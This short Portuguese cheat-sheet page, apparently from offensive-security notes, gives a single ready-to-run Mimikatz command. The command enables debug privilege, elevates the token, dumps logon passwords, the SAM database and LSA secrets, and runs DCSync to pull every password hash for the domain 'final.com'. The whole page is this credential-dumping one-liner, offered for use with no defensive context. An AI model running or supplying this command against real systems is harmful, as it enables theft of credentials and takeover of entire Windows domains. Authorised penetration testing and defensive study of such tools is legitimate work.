---
title: "Mimikatz"
---

# Mimikatz

One-liner completo para dump de credenciais com Mimikatz: habilita debug, eleva token, extrai logon passwords, SAM, segredos LSA e executa DCSync para replicar hashes do domínio inteiro.

```shell
.\mimikatz.exe "privilege::debug" "Token::Elevate" "sekurlsa::LogonPasswords" "lsadump::sam" "lsadump::lsa /patch" "lsadump::secrets" "lsadump::dcsync /domain:final.com /all /csv" "exit"
```
